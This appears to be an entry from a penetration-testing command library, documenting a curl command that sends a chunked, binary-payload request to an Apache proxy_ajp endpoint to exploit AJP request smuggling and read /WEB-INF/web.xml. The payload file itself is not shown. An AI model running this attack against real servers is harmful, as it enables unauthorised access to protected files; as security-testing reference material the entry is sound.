---
data: >-
  curl -i 10.211.55.3/proxy_ajp/ -H 'Transfer-Encoding: chunked' --data-binary
  @data2
tags:
  - http-request
  - exploitation
  - smuggling
type: command
executor: bash
platforms:
  - Linux
id: fe2bfe58-7d8e-4fe2-a5b4-c1b71ba8c773
created_at: '2025-12-13T09:01:21.820Z'
updated_at: '2025-12-13T09:01:21.820Z'
verified: false
validated: true
submitted: true
---
# curl Send Smuggled Request

## Command

```bash
curl -i 10.211.55.3/proxy_ajp/ -H 'Transfer-Encoding: chunked' --data-binary @data2
```

## Description
Sends a crafted HTTP request to the vulnerable Apache server to exploit the AJP request smuggling vulnerability, using chunked encoding and binary payload for smuggling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include the HTTP response headers in the output | Yes |
| `--data-binary @data2` | Sends the binary contents of data2 as the request body without alteration | Yes |
| `10.211.55.3/proxy_ajp/` | The target URL of the vulnerable proxy_ajp endpoint | Yes |
| `-H 'Transfer-Encoding: chunked'` | Adds the header to trigger the smuggling vulnerability | Yes |

## Examples

### Basic Usage

```bash
curl -i 10.211.55.3/proxy_ajp/ -H 'Transfer-Encoding: chunked' --data-binary @data2
```

## Expected Output
HTTP/1.1 200 response with server headers and the contents of /WEB-INF/web.xml, demonstrating successful file read via smuggling.

## Related
- [[procedures/Exploit-HTTP-Request-Smuggling-with-Crafted-Request]]
